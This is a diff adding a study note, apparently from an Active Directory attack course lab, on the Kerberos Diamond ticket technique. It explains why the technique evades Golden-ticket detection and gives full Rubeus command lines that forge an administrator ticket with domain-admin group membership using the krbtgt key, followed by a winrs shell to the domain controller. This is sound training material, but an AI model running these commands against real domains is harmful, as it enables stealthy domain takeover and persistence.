@@ -1,0 +1,44 @@
+- The Diamond ticket attack can be considered a very OPSEC friendly variation of the Golden ticket attack.
+- A Diamond ticket is created by decrypting a valid TGT, making changes to it and re-encrypting it using the AES keys of the krbtgt account.
+- Golden ticket was a TGT forging attack, whereas Diamond ticket is a TGT modification attack.
+- Once again, the persistence lifetime depends on the krbtgt account.
+- A Diamond ticket is more OPSEC safe than a Golden ticket because it has:
+	- Valid ticket times because a TGT issued by the DC is modified, instead of a TGT being forged from the ground up.
+		- This issue is remediated while performing a Golden ticket attack by using LDAP queries, but the lack of a proper TGT request cannot be remediated.
+	- In a Golden ticket attack, there is no corresponding TGT request for TGS/ST requests as the TGT is forged, breaking the normal Kerberos authentication flow, which is an anomaly.
+		- ![[image 1.png]]
+		- If there is a SIEM or any other detection tool looking for a Golden ticket, it will detect that a TGT has been submitted in the authentication process, but no request for the TGT had been made. This will lead to a detection.
+- We still need the secrets for the krbtgt account, but in place of creating a ticket, we decrypt an existing TGT, modify it, re-encrypt it and then send it again to the DC.
+- Will the TGT after a Diamond attack still be a valid TGT?
+	- Yes, because almost the only validation done by the DC, is whether it can decrypt the TGT using the secrets of the krbtgt account.
+- Steps in a Diamond Ticket attack
+	- ![[Pasted image 20250728180303.png]]
+	- Acquire AES key of the krbtgt account.
+	- Decrypt the TGT using the AES key of the krbtgt account.
+	- Modify the TGT to get the desired privileges.
+	- Re-encrypt the TGT using the AES key of the krbtgt account.
+
+#### Performing a Diamond Ticket Attack using Rubeus
+- We would still need krbtgt AES keys. We can use the following Rubeus command to create a Diamond ticket:
+	- `Rubeus.exe diamond /krbkey:<AES key of the krbtgt account> /user:studentX /password:<password of the StudentX account> /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
+		- The `/krbkey` option is used to specify the AES key of the krbtgt account.
+		- The reason we are passing the credentials of our user to Rubeus here is to create an initial TGT request, which needs to be sent to the DC before we perform the rest of the steps of the attack; which are, decrypting the TGT we receive, modifying it, re-encrypting it and sending it over to the DC.
+		- RC4/AES keys of the user can be used as well, instead of the credentials we are supplying in this command.
+	- We can also use the `/tgtdeleg` option in place of the credentials here in case we already have access to a domain user. (In our case, we would definitely be running the attack as a domain user, and would be able to leverage this option.)
+		- `Rubeus.exe diamond /krbkey:<AES key of the krbtgt account> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
+
+#### Learning Objective 10
+- Use DA privileges obtained earlier to execute the Diamond Ticket attack.
+	- Purging the tickets we may already have cached.
+		- `klist purge`
+	- Trying to access the DC now, to demonstrate that we no longer have the required privileges to do so, after purging the cached tickets.
+		- `winrs -r:dcorp-dc.dollarcorp.moneycorp.local cmd`
+			- This command is expected to fail.
+	- Forging a Diamond Ticket:
+		- `C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args diamond /krbkey:<AES key of the krbtgt account> /tgtdeleg /enctype:aes /ticketuser:administrator /domain:dollarcorp.moneycorp.local /dc:dcorp-dc.dollarcorp.moneycorp.local /ticketuserid:500 /groups:512 /createnetonly:C:\Windows\System32\cmd.exe /show /ptt`
+			- We need to execute Rubeus commands using a high integrity process (local admin privileges) for them to work.
+	- Trying to access the DC to demonstrate success of the attack (from the newly created  CMD process):
+		- `winrs -r:dcorp-dc cmd`
+			- This command is expected to work.
+		- `set username`
+		- `exit`
